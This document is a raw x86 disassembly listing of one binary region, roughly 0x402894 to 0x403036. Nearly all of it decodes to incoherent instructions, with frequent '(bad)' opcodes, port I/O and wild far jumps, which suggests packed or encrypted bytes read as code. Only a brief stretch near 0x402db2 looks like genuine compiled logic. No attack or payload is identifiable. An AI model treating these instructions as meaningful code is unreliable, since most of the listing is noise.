  402894:	adc    al,0x3e
  402896:	sbb    eax,0xbbdb5315
  40289b:	daa    
  40289c:	fisubr WORD PTR [ebp+0x2c]
  40289f:	push   es
  4028a0:	ins    DWORD PTR es:[edi],dx
  4028a1:	out    dx,al
  4028a2:	fstp   DWORD PTR [ebx-0x111f461d]
  4028a8:	(bad)  
  4028a9:	mov    cl,BYTE PTR [eax]
  4028ab:	in     al,dx
  4028ac:	aam    0x94
  4028ae:	neg    al
  4028b0:	push   esp
  4028b1:	movntq QWORD PTR [ecx],mm2
  4028b4:	bound  esp,QWORD PTR [edx-0x5a]
  4028b7:	popf   
  4028b8:	addr16 mov cl,0x1
  4028bb:	cmp    dh,bh
  4028bd:	stc    
  4028be:	lds    edx,FWORD PTR [edi-0x1d]
  4028c1:	and    DWORD PTR [ecx],ecx
  4028c3:	sti    
  4028c4:	(bad)  
  4028c5:	xlat   BYTE PTR ds:[ebx]
  4028c6:	out    dx,al
  4028c7:	xchg   ecx,eax
  4028c8:	dec    eax
  4028c9:	push   edx
  4028ca:	adc    BYTE PTR [esp+edi*4+0x64],dl
  4028ce:	gs jo  0x4028a3
  4028d1:	test   al,0x43
  4028d3:	add    eax,0x3c3d663f
  4028d8:	sar    DWORD PTR [eax+0x3529e2a0],cl
  4028de:	test   al,0xec
  4028e0:	out    0xc6,eax
  4028e2:	add    ah,BYTE PTR [ecx+0x2250e89f]
  4028e8:	or     DWORD PTR fs:[esi+0x2e],esi
  4028ec:	push   ds
  4028ed:	fchs   
  4028ef:	mov    ch,0x8
  4028f1:	add    DWORD PTR [eax+0xa],ecx
  4028f4:	neg    DWORD PTR [edx-0x749b29b]
  4028fa:	mov    al,ds:0x797c920b
  4028ff:	xor    eax,ebp
  402901:	xchg   edx,eax
  402902:	fs push esi
  402904:	jo     0x402929
  402906:	mov    ah,0x7f
  402908:	icebp  
  402909:	mov    ch,0xcb
  40290b:	mov    ecx,0x1b4e8a76
  402910:	xchg   ah,dh
  402912:	lds    edx,FWORD PTR [esi-0x6e922cb6]
  402918:	dec    esp
  402919:	cmp    dh,BYTE PTR ds:0x37617c7e
  40291f:	pop    edx
  402920:	dec    esi
  402921:	or     BYTE PTR [ecx+0x4eb5d599],bl
  402927:	(bad)  
  402929:	inc    edx
  40292a:	aaa    
  40292b:	or     eax,DWORD PTR [edi-0x2f]
  40292e:	mov    edx,0x21d02e94
  402933:	sub    eax,0x202cb9d0
  402938:	adc    al,0xdd
  40293a:	ds retf 0xec17
  40293e:	sahf   
  40293f:	mov    ecx,0xe9bc47bd
  402944:	scas   eax,DWORD PTR es:[edi]
  402945:	lods   eax,DWORD PTR ds:[esi]
  402946:	(bad)  
  402947:	xor    DWORD PTR [ecx-0x53],esp
  40294a:	mov    ebp,DWORD PTR [ebx+edi*2-0x2c]
  40294e:	(bad)  
  402950:	xchg   ebx,eax
  402951:	add    eax,0xa8b0e4d4
  402956:	mov    ebx,0x20475137
  40295b:	loop   0x40299e
  40295d:	(bad)  
  40295e:	out    dx,eax
  40295f:	and    ebx,DWORD PTR [ebp-0x6fe6f6ce]
  402965:	cmc    
  402966:	shr    ecx,1
  402968:	mov    al,ds:0x5aa61f23
  40296d:	(bad)  
  40296e:	jmp    0x402930
  402970:	test   esi,edi
  402972:	stc    
  402973:	outs   dx,DWORD PTR ds:[esi]
  402974:	in     al,0xff
  402976:	jge    0x40295d
  402978:	fs out dx,al
  40297a:	dec    DWORD PTR [eax-0x24ad4c71]
  402980:	mov    ch,0x46
  402982:	ins    BYTE PTR es:[edi],dx
  402983:	daa    
  402984:	ss ret 
  402986:	jmp    0x497ef327
  40298b:	cdq    
  40298c:	pop    eax
  40298d:	adc    al,0xa0
  40298f:	mov    cl,0xc9
  402991:	xor    ebp,DWORD PTR [ecx-0x41da3e41]
  402997:	jecxz  0x402a15
  402999:	add    esp,DWORD PTR [edx+0x21]
  40299c:	and    bl,BYTE PTR gs:[edi-0x7ddf90e0]
  4029a3:	add    bh,bl
  4029a5:	and    al,0x7c
  4029a7:	inc    edi
  4029a8:	jae    0x402933
  4029aa:	test   BYTE PTR [esi+esi*1-0x141d91b0],cl
  4029b1:	ficom  DWORD PTR [eax]
  4029b3:	cmp    dh,BYTE PTR [edx+0x1e5a58b4]
  4029b9:	mov    ebp,0x465d5646
  4029be:	jbe    0x4029a5
  4029c0:	adc    dl,BYTE PTR [edx]
  4029c2:	jge    0x4029a3
  4029c4:	xchg   esp,eax
  4029c5:	cmp    edi,edi
  4029c7:	or     dh,BYTE PTR [edi+0x58]
  4029ca:	push   0xffffffdb
  4029cc:	xchg   DWORD PTR ds:0x9f6739e0,esp
  4029d2:	iret   
  4029d3:	xchg   esp,eax
  4029d4:	imul   edi,ebx,0xffffffc5
  4029d7:	in     al,0x19
  4029d9:	mov    DWORD PTR [ecx+0x47],edi
  4029dc:	or     cl,BYTE PTR [edi]
  4029de:	frstor [edi]
  4029e0:	nop
  4029e1:	daa    
  4029e2:	retf   
  4029e3:	ret    0x49ae
  4029e6:	rcr    BYTE PTR [ecx+0x18],0xb
  4029ea:	mov    ecx,0xd9647b20
  4029ef:	popf   
  4029f0:	xchg   ebx,eax
  4029f1:	sub    bh,BYTE PTR [ebp+0x57]
  4029f4:	cmp    al,0x16
  4029f6:	popf   
  4029f7:	adc    BYTE PTR [ebp-0x1c],dh
  4029fa:	and    al,0x7f
  4029fc:	sub    DWORD PTR [ebx+0x28bf6a03],ebx
  402a02:	(bad)  
  402a03:	jmp    0x4029b3
  402a05:	mov    edx,0x3974f10e
  402a0a:	nop
  402a0b:	fs mov ch,0xae
  402a0e:	and    ah,BYTE PTR [ecx-0x8337b81]
  402a14:	push   ebx
  402a15:	stos   DWORD PTR es:[edi],eax
  402a16:	aam    0xcd
  402a18:	lock mov bl,0xed
  402a1b:	fild   DWORD PTR [edi+edi*2]
  402a1e:	jecxz  0x402a60
  402a20:	retf   0xd7f
  402a23:	jne    0x4029e1
  402a25:	inc    edi
  402a26:	and    eax,DWORD PTR [edx+ecx*8-0x42]
  402a2a:	mov    esi,0x59204921
  402a2f:	xlat   BYTE PTR ds:[ebx]
  402a30:	sbb    ecx,DWORD PTR fs:[edx-0x7]
  402a34:	call   0xebbe:0x6ea5aa51
  402a3b:	bound  eax,QWORD PTR [ebx+0x4777d44]
  402a41:	lods   al,BYTE PTR ds:[esi]
  402a42:	xchg   edx,eax
  402a43:	dec    edi
  402a44:	xor    edx,esp
  402a46:	push   edi
  402a47:	popf   
  402a48:	cwde   
  402a49:	jne    0x402a09
  402a4b:	dec    DWORD PTR [esi]
  402a4d:	push   cs
  402a4e:	mov    edi,0x833f9c79
  402a53:	mov    WORD PTR [ecx+0x5ed8b241],?
  402a59:	outs   dx,BYTE PTR ds:[esi]
  402a5a:	jmp    0x402a16
  402a5c:	out    dx,eax
  402a5d:	imul   ebp,ebx,0x23018672
  402a63:	std    
  402a64:	mov    ds,WORD PTR [edx+0xda8be02]
  402a6a:	mov    bl,0xae
  402a6c:	and    bh,BYTE PTR cs:[eax]
  402a6f:	push   ebx
  402a70:	pusha  
  402a71:	xchg   ebp,eax
  402a72:	ror    BYTE PTR ds:0xe575032e,0x3d
  402a79:	xchg   ecx,eax
  402a7a:	popf   
  402a7b:	aaa    
  402a7c:	stos   DWORD PTR es:[edi],eax
  402a7d:	inc    esi
  402a7e:	or     DWORD PTR [eax+ecx*2-0x59],ebp
  402a82:	and    BYTE PTR [edx],dh
  402a84:	mov    esp,0xf9b809a6
  402a89:	test   eax,0x8f211b2a
  402a8e:	dec    ecx
  402a8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a90:	out    dx,al
  402a91:	dec    edx
  402a92:	inc    ebp
  402a93:	push   esp
  402a94:	ins    BYTE PTR es:[edi],dx
  402a95:	inc    ebx
  402a96:	add    cl,BYTE PTR [edi+ebp*8]
  402a99:	bound  edx,QWORD PTR ds:0xe77e2881
  402a9f:	sbb    DWORD PTR [edi],edx
  402aa1:	jg     0x402af3
  402aa3:	sub    eax,0xa6ea67b8
  402aa8:	retf   0x298
  402aab:	jne    0x402b08
  402aad:	jle    0x402ac2
  402aaf:	loope  0x402b1f
  402ab1:	shl    esi,0xa
  402ab4:	cmovae esi,esp
  402ab7:	pop    edx
  402ab8:	sbb    DWORD PTR [eax+ecx*4],ebx
  402abb:	(bad)  
  402abc:	ds jno 0x402adf
  402abf:	jge    0x402b3c
  402ac1:	fist   DWORD PTR [edx]
  402ac3:	(bad)  
  402ac4:	hlt    
  402ac5:	adc    eax,0x9c9efb17
  402aca:	div    BYTE PTR [esi-0x1]
  402acd:	pop    esp
  402ace:	outs   dx,BYTE PTR ds:[esi]
  402acf:	fld    TBYTE PTR [ebx+0x57]
  402ad2:	adc    DWORD PTR [eax+0x63],eax
  402ad5:	dec    edx
  402ad6:	sbb    esp,0xaed1017f
  402adc:	repnz adc cl,BYTE PTR [esp+esi*8-0x25]
  402ae1:	jmp    0x402ad6
  402ae3:	lods   eax,DWORD PTR ds:[esi]
  402ae4:	xchg   ebx,eax
  402ae5:	cmp    al,0x35
  402ae7:	je     0x402b63
  402ae9:	aaa    
  402aea:	(bad)  
  402aeb:	ins    DWORD PTR es:[edi],dx
  402aec:	out    0x2c,al
  402aee:	jecxz  0x402aee
  402af0:	sub    al,0xa1
  402af2:	stos   BYTE PTR es:[edi],al
  402af3:	jno    0x93d41762
  402af9:	lods   eax,DWORD PTR ds:[esi]
  402afa:	repnz cmp BYTE PTR [ecx-0x3858839c],bh
  402b01:	cmp    eax,0xdace0643
  402b06:	xor    bl,cl
  402b08:	inc    edx
  402b09:	inc    esp
  402b0a:	jge    0x402b2e
  402b0c:	(bad)  
  402b0d:	mov    ebx,0xe9c82b99
  402b12:	call   0xc2c8:0xc0000002
  402b19:	int    0xda
  402b1b:	rcr    ebx,1
  402b1d:	aad    0x7b
  402b1f:	bound  ebp,QWORD PTR [esi+0x37]
  402b22:	sbb    BYTE PTR [ebp-0x2],dl
  402b25:	cmp    eax,0x7878128e
  402b2a:	(bad)  
  402b2b:	jle    0x402ba5
  402b2d:	js     0x402ac8
  402b2f:	jmp    0x402b40
  402b31:	xchg   edx,eax
  402b32:	test   bl,0x3b
  402b35:	in     eax,0x3a
  402b37:	jmp    0xb3f:0x580529f9
  402b3e:	xchg   edx,eax
  402b3f:	fidiv  WORD PTR [edi]
  402b41:	shr    WORD PTR [ebp+0x22f4af01],1
  402b48:	dec    eax
  402b49:	add    DWORD PTR [esp+ebx*1-0x6d3eb8d6],0xffffffda
  402b51:	inc    ecx
  402b52:	ror    DWORD PTR [ecx],cl
  402b54:	xchg   ebx,eax
  402b55:	or     esi,0xb5d2009e
  402b5b:	dec    edi
  402b5c:	pop    eax
  402b5d:	jb     0x402b79
  402b5f:	jl     0x402bd7
  402b61:	int3   
  402b62:	push   edx
  402b63:	mov    ecx,0x29abd46
  402b68:	xchg   ebp,eax
  402b69:	inc    ebp
  402b6a:	bound  edx,QWORD PTR [edi]
  402b6c:	pushf  
  402b6d:	pop    eax
  402b6e:	shl    al,cl
  402b70:	ss (bad) 
  402b72:	outs   dx,DWORD PTR ds:[esi]
  402b73:	and    dh,BYTE PTR [ebp+0x62]
  402b76:	inc    ecx
  402b77:	aad    0x35
  402b79:	fdivr  DWORD PTR [ebx-0xd]
  402b7c:	fwait
  402b7d:	dec    esi
  402b7e:	fbstp  TBYTE PTR [esp+edi*8-0x55]
  402b82:	mov    edi,DWORD PTR [edi-0x5b8c5172]
  402b88:	inc    esi
  402b89:	sbb    DWORD PTR [edx],ebx
  402b8b:	(bad)  
  402b8c:	push   cs
  402b8d:	pop    ebp
  402b8e:	cmp    al,0x7d
  402b90:	call   0x451b:0x685ff78
  402b97:	sbb    esi,esp
  402b99:	push   es
  402b9a:	retf   0xd660
  402b9d:	ror    ecx,1
  402b9f:	cvtps2pd xmm7,QWORD PTR [edi+edx*4+0x40]
  402ba4:	cmp    edi,esp
  402ba6:	es inc esi
  402ba8:	fdiv   DWORD PTR [ebp+0x3e]
  402bab:	xor    ah,dh
  402bad:	push   es
  402bae:	fldenv [ebx+0x6e]
  402bb1:	lahf   
  402bb2:	or     al,0x48
  402bb4:	or     BYTE PTR ds:0xd43156f3,bl
  402bba:	inc    esp
  402bbb:	enter  0xecea,0x18
  402bbf:	push   ebp
  402bc0:	mov    DWORD PTR [eax-0x9],esi
  402bc3:	jbe    0x402bbe
  402bc5:	paddusb mm5,QWORD PTR [edx+0x6be8883a]
  402bcc:	xor    eax,esi
  402bce:	jno    0x402bef
  402bd0:	sbb    dl,dh
  402bd2:	out    dx,al
  402bd3:	mov    bh,0x8f
  402bd5:	jg     0x402bdc
  402bd7:	rcr    BYTE PTR [edx],0x5c
  402bda:	sub    eax,0xc3417035
  402bdf:	dec    ebx
  402be0:	xor    DWORD PTR [ecx],edx
  402be2:	(bad)  
  402be3:	cwde   
  402be4:	popa   
  402be5:	cdq    
  402be6:	call   0xd16c98b3
  402beb:	fild   DWORD PTR [esi+0x42d41c89]
  402bf1:	mov    bl,0x9f
  402bf3:	inc    ecx
  402bf4:	setle  BYTE PTR [ebx+0x47]
  402bf8:	sub    BYTE PTR [edi-0x7a],dh
  402bfb:	mov    cl,0x2b
  402bfd:	cmp    BYTE PTR [ecx+0x61],0x84
  402c01:	cmp    DWORD PTR [eax],esi
  402c03:	lock dec esi
  402c05:	push   ebp
  402c06:	dec    ecx
  402c07:	push   ds
  402c08:	fst    QWORD PTR [edi+eiz*4]
  402c0b:	icebp  
  402c0c:	(bad)  
  402c0d:	jmp    FWORD PTR [ebx+0xaf92bd1]
  402c13:	cmp    ecx,edx
  402c15:	mov    dh,0x0
  402c18:	repz or eax,0x1bf919af
  402c1e:	mov    BYTE PTR [edx+0x36],ch
  402c21:	and    al,BYTE PTR [eax-0x75]
  402c24:	xchg   edi,eax
  402c25:	hlt    
  402c26:	or     BYTE PTR [edi],cl
  402c28:	cwde   
  402c29:	call   0x1c4f:0x70124c51
  402c30:	mov    bl,0xc1
  402c32:	lods   eax,DWORD PTR ds:[esi]
  402c33:	ret    
  402c34:	out    dx,al
  402c35:	(bad)  
  402c36:	lods   eax,DWORD PTR ds:[esi]
  402c37:	std    
  402c38:	jbe    0x402c6c
  402c3a:	call   0xfc5026cf
  402c3f:	cmp    DWORD PTR [ecx+ecx*4+0x3e],edi
  402c43:	push   0xffffff87
  402c45:	test   BYTE PTR [ecx-0x67883b39],0xd6
  402c4c:	mov    ds:0x88bc9712,al
  402c51:	push   esp
  402c52:	fnstcw WORD PTR [eax+0x765db2]
  402c58:	aam    0x5e
  402c5a:	add    edi,DWORD PTR [ecx]
  402c5c:	or     al,0xb5
  402c5e:	in     eax,dx
  402c5f:	mov    eax,0x5299fe64
  402c64:	retf   
  402c65:	imul   esp,DWORD PTR [edi+0x4f0a3152],0xffffffd6
  402c6c:	push   edx
  402c6d:	or     dh,BYTE PTR [ecx-0x1d]
  402c70:	adc    BYTE PTR [eax-0x3f],bh
  402c73:	mov    ds:0x47538f1d,eax
  402c78:	xor    DWORD PTR [edi+0x7a],0x8954ef78
  402c7f:	jmp    0x23ae:0xc2a55a87
  402c86:	nop
  402c87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c88:	(bad)  
  402c89:	sahf   
  402c8a:	ins    BYTE PTR es:[edi],dx
  402c8b:	loope  0x402ce2
  402c8d:	pop    es
  402c8e:	xor    ah,BYTE PTR [ebx+0x1e69b5b4]
  402c94:	jg     0x402c5f
  402c96:	push   ecx
  402c97:	or     al,BYTE PTR [edi]
  402c99:	mov    BYTE PTR [edi],dl
  402c9b:	ret    
  402c9c:	addr16 sbb eax,0x1130fbb3
  402ca2:	pop    ds
  402ca3:	ds cs (bad) 
  402ca7:	mov    BYTE PTR [edi],al
  402ca9:	lahf   
  402caa:	shl    BYTE PTR [esi],cl
  402cac:	adc    DWORD PTR [ebp-0x5f],ebp
  402caf:	int3   
  402cb0:	pop    ss
  402cb1:	aaa    
  402cb2:	cmp    al,0x10
  402cb4:	retf   
  402cb5:	cwde   
  402cb6:	sbb    ebp,DWORD PTR [edx]
  402cb8:	cwde   
  402cb9:	push   ss
  402cba:	(bad)  
  402cbb:	(bad)  
  402cbc:	dec    edi
  402cbd:	jbe    0x402c74
  402cbf:	retf   0xd08f
  402cc2:	(bad)  [edx]
  402cc4:	and    bl,ah
  402cc6:	mov    ds:0x4b56fafb,eax
  402ccb:	add    BYTE PTR [edx+0x28],cl
  402cce:	add    ch,BYTE PTR [esi+0x6c688f33]
  402cd4:	add    edx,ebx
  402cd6:	mov    eax,0x6ee9c8b9
  402cdb:	fsubr  QWORD PTR [ebx+0x50f4e50a]
  402ce1:	jmp    0x4a2f:0x2bc7f13a
  402ce8:	and    DWORD PTR [eax+0x3b],ebx
  402ceb:	test   DWORD PTR [edx],edi
  402ced:	jp     0x402c6f
  402cef:	bnd jmp 0x626d8a91
  402cf5:	aad    0xa6
  402cf7:	aad    0x46
  402cf9:	adc    eax,0xd6b3254d
  402cfe:	out    dx,eax
  402cff:	icebp  
  402d00:	nop
  402d01:	cmp    ah,BYTE PTR [ebx+0x74]
  402d04:	mov    dl,0x22
  402d06:	arpl   WORD PTR [eax+esi*4+0x44],sp
  402d0a:	sub    eax,0x8b4fdecf
  402d0f:	pop    ebx
  402d10:	das    
  402d11:	(bad)  
  402d13:	ins    DWORD PTR es:[edi],dx
  402d14:	push   esi
  402d15:	aas    
  402d16:	pop    ecx
  402d18:	lahf   
  402d19:	mov    ah,0x5e
  402d1b:	mov    ebx,DWORD PTR [edx+edi*2]
  402d1e:	div    bh
  402d20:	xor    DWORD PTR ds:0x6d4eaea1,esi
  402d26:	pop    esi
  402d27:	sti    
  402d28:	pop    ss
  402d29:	xor    DWORD PTR [ecx],edi
  402d2b:	inc    edi
  402d2c:	jne    0x402d64
  402d2e:	into   
  402d2f:	push   esi
  402d30:	sar    DWORD PTR [esi+0x3631f9ca],cl
  402d36:	fcom   QWORD PTR [edx]
  402d38:	loope  0x402d25
  402d3a:	rcl    DWORD PTR [ebx],0x16
  402d3d:	xor    DWORD PTR [ecx-0x7],ebx
  402d40:	sbb    ebp,0xffffffa6
  402d43:	call   FWORD PTR [edi]
  402d45:	repz cmp eax,0xf11cf281
  402d4b:	scas   al,BYTE PTR es:[edi]
  402d4c:	add    BYTE PTR [eax-0x3478bad0],bh
  402d52:	pop    ds
  402d53:	icebp  
  402d54:	je     0x402d28
  402d56:	pushf  
  402d57:	fistp  WORD PTR [eax]
  402d59:	adc    DWORD PTR [edi+edi*1],edi
  402d5c:	sub    al,0xa4
  402d5e:	outs   dx,DWORD PTR ds:[esi]
  402d5f:	adc    eax,0x77f07d87
  402d64:	sub    al,0x42
  402d66:	add    BYTE PTR [esi-0x5219bd76],bl
  402d6c:	sub    edx,DWORD PTR [edi]
  402d6e:	icebp  
  402d6f:	xchg   esp,eax
  402d70:	aaa    
  402d71:	jp     0x402d53
  402d73:	jo     0x402dee
  402d75:	xchg   edi,eax
  402d76:	out    dx,al
  402d77:	(bad)  
  402d78:	aas    
  402d79:	lea    esi,[edx+ecx*1-0x76d7a896]
  402d80:	cmp    BYTE PTR es:[eax-0x77],0xd0
  402d85:	push   0x4da70efa
  402d8a:	xchg   DWORD PTR [ebx],esi
  402d8c:	xor    eax,0x1d3a4112
  402d91:	cmc    
  402d92:	mov    ebx,0x31f0faa
  402d97:	out    0x27,al
  402d99:	and    BYTE PTR [ecx-0x2f],dl
  402d9c:	imul   esp,esi,0x85586f1e
  402da2:	lock test al,0x80
  402da5:	repnz out 0x5b,al
  402da8:	daa    
  402da9:	mov    edx,ecx
  402dab:	aas    
  402dac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dad:	fsub   DWORD PTR [edi+0x58]
  402db0:	sub    ecx,edi
  402db2:	mov    WORD PTR [ebp-0x4],cx
  402db6:	jmp    0x402dc8
  402dbb:	xor    eax,esi
  402dbd:	lea    eax,[eax+ecx*1+0x327298]
  402dc4:	mov    WORD PTR [ebp-0x4],ax
  402dc8:	mov    eax,DWORD PTR [ebp-0xc]
  402dcb:	cmp    eax,ebx
  402dcd:	je     0x403080
  402dd3:	mov    eax,DWORD PTR [ebp-0x8]
  402dd6:	mov    DWORD PTR [eax],0x60341eb0
  402ddc:	jmp    0x404380
  402de1:	jmp    0x403080
  402de6:	(bad)  
  402de7:	leave  
  402de8:	(bad)  
  402de9:	vpsubusw xmm2,xmm4,xmm5
  402ded:	leave  
  402dee:	repnz int 0x29
  402df1:	cld    
  402df2:	sbb    DWORD PTR [eax+0x170c9e32],0x78
  402df9:	js     0x402df9
  402dfb:	jle    0x402e75
  402dfd:	js     0x402e0d
  402dff:	jo     0x402dd1
  402e01:	xchg   edi,eax
  402e02:	cwde   
  402e03:	xor    bl,ah
  402e05:	sbb    BYTE PTR [ecx],ch
  402e07:	dec    esp
  402e08:	mov    eax,0x7f12b843
  402e0d:	inc    esp
  402e0e:	lahf   
  402e0f:	imul   edx,DWORD PTR [eax],0xca7860b2
  402e15:	cdq    
  402e16:	cmp    DWORD PTR ds:0x1c74ff34,esp
  402e1c:	scas   al,BYTE PTR es:[edi]
  402e1d:	loop   0x402deb
  402e1f:	inc    eax
  402e20:	mov    al,0xe2
  402e22:	sub    dl,BYTE PTR [ebx+0x35d9475f]
  402e28:	test   al,0xa3
  402e2a:	ins    DWORD PTR es:[edi],dx
  402e2b:	inc    eax
  402e2c:	sbb    BYTE PTR [esi+0x2cc340e3],dh
  402e32:	sbb    bl,bl
  402e34:	mov    BYTE PTR [ebx+0xa1be7d],bh
  402e3a:	aad    0x28
  402e3c:	or     al,0x76
  402e3e:	ins    DWORD PTR es:[edi],dx
  402e3f:	test   al,0x9f
  402e41:	mov    edi,0x5ece3aa
  402e46:	ins    DWORD PTR es:[edi],dx
  402e47:	jbe    0x402e57
  402e49:	inc    edi
  402e4a:	jg     0x402e8e
  402e4c:	addr16 ret 
  402e4e:	mov    ch,0x5b
  402e50:	jno    0x402e29
  402e52:	pop    ecx
  402e53:	shl    BYTE PTR [ebp+0x1],0xd3
  402e57:	(bad)  
  402e58:	pop    esp
  402e59:	dec    ecx
  402e5a:	jae    0x402dfe
  402e5c:	outs   dx,BYTE PTR ds:[esi]
  402e5d:	jbe    0x402e8c
  402e5f:	push   0x3a
  402e61:	dec    edx
  402e62:	push   0x9f46ee00
  402e67:	xchg   ebx,eax
  402e68:	(bad)  
  402e69:	icebp  
  402e6a:	push   esp
  402e6b:	mov    eax,0xa7e877f1
  402e70:	xchg   al,ch
  402e72:	dec    ebx
  402e73:	fldcw  WORD PTR [edi-0xa5e0104]
  402e79:	sub    BYTE PTR [eax+0x39],cl
  402e7c:	inc    ebp
  402e7d:	into   
  402e7e:	sub    DWORD PTR [esi],ebx
  402e80:	dec    ebx
  402e81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e82:	aad    0x60
  402e84:	outs   dx,BYTE PTR ds:[esi]
  402e85:	test   BYTE PTR [ecx-0x6c],ch
  402e88:	dec    ebp
  402e89:	push   esi
  402e8a:	add    eax,0x8cc6fce2
  402e8f:	call   0x58477e23
  402e94:	mov    ds:0x8af87ef4,al
  402e99:	mov    esp,0xfa18ac7a
  402e9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e9f:	jbe    0x402ed8
  402ea1:	repnz xchg esp,eax
  402ea3:	and    DWORD PTR [ecx],0xa4cd6e08
  402ea9:	or     DWORD PTR [edi+0x6cbd6bf2],0xffffff8f
  402eb0:	push   eax
  402eb1:	aad    0x63
  402eb3:	sbb    al,0xa7
  402eb5:	push   ebp
  402eb6:	outs   dx,BYTE PTR ds:[esi]
  402eb7:	sti    
  402eb8:	mov    al,ds:0x7d7a52a2
  402ebd:	cli    
  402ebe:	scas   eax,DWORD PTR es:[edi]
  402ebf:	fstp   QWORD PTR [ebx]
  402ec1:	popf   
  402ec2:	or     al,0x56
  402ec4:	sub    ebp,DWORD PTR [edi+0x5]
  402ec7:	lahf   
  402ec8:	test   al,0xc4
  402eca:	mov    eax,ds:0xea83df7c
  402ecf:	push   ecx
  402ed0:	sti    
  402ed1:	mov    al,BYTE PTR [eax-0x697f9ecf]
  402ed7:	sahf   
  402ed8:	xor    ecx,ebp
  402eda:	and    bh,cl
  402edc:	fadd   st(6),st
  402ede:	sahf   
  402edf:	fild   WORD PTR [edi+esi*2+0x36]
  402ee3:	pop    edi
  402ee4:	div    DWORD PTR [edi]
  402ee6:	cmc    
  402ee7:	loop   0x402e82
  402ee9:	jmp    0x402e77
  402eeb:	test   DWORD PTR [esi+0x1f],edi
  402eee:	adc    DWORD PTR ds:0x7ef65636,edx
  402ef4:	js     0x402f3a
  402ef6:	push   ebp
  402ef7:	add    BYTE PTR [ecx],bl
  402ef9:	js     0x402f73
  402efb:	bound  esi,QWORD PTR [eax-0x7]
  402efe:	xor    ecx,DWORD PTR [edx+0x75]
  402f01:	retf   
  402f02:	mov    ecx,0x1eb3ed51
  402f07:	sahf   
  402f08:	sti    
  402f09:	jno    0xbff38562
  402f0f:	mov    ebx,DWORD PTR [ebx+0x320757ec]
  402f15:	into   
  402f16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f17:	dec    ecx
  402f18:	adc    BYTE PTR [ecx+0x5e],cl
  402f1b:	leave  
  402f1c:	cmp    DWORD PTR [ecx],edx
  402f1e:	js     0x402f85
  402f20:	fistp  QWORD PTR [esi]
  402f22:	arpl   WORD PTR [edx-0x5871e8f],sp
  402f28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f29:	fwait
  402f2a:	cwde   
  402f2b:	sbb    dl,dh
  402f2d:	pop    ds
  402f2e:	call   0x9e84b3bc
  402f33:	ins    DWORD PTR es:[edi],dx
  402f34:	dec    ecx
  402f35:	push   0xffffffe2
  402f37:	sub    BYTE PTR [esi+0x7c],bh
  402f3a:	mov    al,0x3
  402f3c:	mov    BYTE PTR [edi],cl
  402f3e:	aas    
  402f3f:	fldl2e 
  402f41:	pop    edi
  402f42:	icebp  
  402f43:	cs push 0xfffffff7
  402f46:	fild   DWORD PTR [eax-0x14]
  402f49:	(bad)  
  402f4b:	push   ds
  402f4c:	inc    edx
  402f4d:	aaa    
  402f4e:	mov    ecx,0x9148af15
  402f53:	push   esi
  402f54:	loope  0x402fc8
  402f56:	push   es
  402f57:	lsl    esp,di
  402f5a:	fbld   TBYTE PTR [ecx+0x209ebb9b]
  402f60:	out    0xda,eax
  402f62:	enter  0x5a3c,0x77
  402f66:	scas   al,BYTE PTR es:[edi]
  402f67:	jae    0x402f62
  402f69:	cld    
  402f6a:	jns    0x402f11
  402f6c:	xchg   edx,eax
  402f6d:	inc    ecx
  402f6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f6f:	add    bh,BYTE PTR [esi]
  402f71:	dec    ecx
  402f72:	int    0x4f
  402f74:	aas    
  402f75:	cmp    edx,DWORD PTR [eax-0x1b516438]
  402f7b:	enter  0xc3b1,0xbe
  402f7f:	jne    0x402f0e
  402f81:	(bad)  
  402f82:	scas   al,BYTE PTR es:[edi]
  402f83:	and    al,0xfa
  402f85:	dec    ebp
  402f86:	jle    0x402faf
  402f88:	mov    edx,0x6b544214
  402f8d:	add    DWORD PTR [ebx+0x55],0x5b
  402f91:	sbb    DWORD PTR [ebx+0x35e213dd],edx
  402f97:	push   0x9580f7de
  402f9c:	push   ebx
  402f9d:	cmp    DWORD PTR ds:0xebb7ff10,esi
  402fa3:	and    esi,DWORD PTR [ebx+0x7aebb4ab]
  402fa9:	or     BYTE PTR [esi],0xc9
  402fac:	pop    esi
  402fad:	rcr    BYTE PTR [eax],cl
  402faf:	pushf  
  402fb0:	in     eax,0xba
  402fb2:	dec    ebx
  402fb3:	cmp    al,0xdf
  402fb5:	test   DWORD PTR [edx],ecx
  402fb7:	out    dx,al
  402fb8:	push   eax
  402fb9:	aad    0x46
  402fbb:	cdq    
  402fbc:	adc    DWORD PTR [edx+0x50],esp
  402fbf:	ins    DWORD PTR es:[edi],dx
  402fc0:	xlat   BYTE PTR ds:[ebx]
  402fc1:	inc    ebx
  402fc2:	into   
  402fc3:	es call 0xea9ddbf4
  402fc9:	sub    al,0xad
  402fcb:	and    bl,BYTE PTR [ecx-0x39e67628]
  402fd1:	imul   edi,DWORD PTR fs:[ecx],0x6e
  402fd5:	std    
  402fd6:	jp     0x402f7f
  402fd8:	xchg   esi,eax
  402fd9:	jecxz  0x402fb5
  402fdb:	dec    ebx
  402fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402fdd:	call   0x82b2:0x97ded4f8
  402fe4:	sbb    bh,BYTE PTR [esi-0x4e]
  402fe7:	ss pop edi
  402fe9:	mov    ds:0xa88d4497,eax
  402fee:	mov    ds:0x4b9c5f42,al
  402ff3:	mov    eax,ds:0x86300a37
  402ff8:	jae    0x402fde
  402ffa:	cmp    ebp,DWORD PTR [edi+0x42]
  402ffd:	(bad)  [edi-0x5199a4d7]
  403003:	fsub   QWORD PTR [edi]
  403005:	push   cs
  403006:	and    BYTE PTR [ebx+0x2b],0x90
  40300a:	(bad)  
  40300b:	fisttp QWORD PTR [ebp+0x7df71cb8]
  403011:	out    dx,al
  403012:	data16 js 0x402ffa
  403015:	cmp    cl,0x6
  403018:	push   eax
  403019:	fcom   DWORD PTR [edx]
  40301b:	and    DWORD PTR ds:0xf07a543c,ebp
  403021:	xor    ah,ch
  403023:	ret    0x117a
  403026:	sbb    dh,BYTE PTR [ecx]
  403028:	mov    DWORD PTR [edx],eax
  40302a:	clc    
  40302b:	aam    0xba
  40302d:	call   0x2457:0x245f2805
  403034:	pop    ebx
  403035:	push   ss
  403036:	out    0xbe,eax
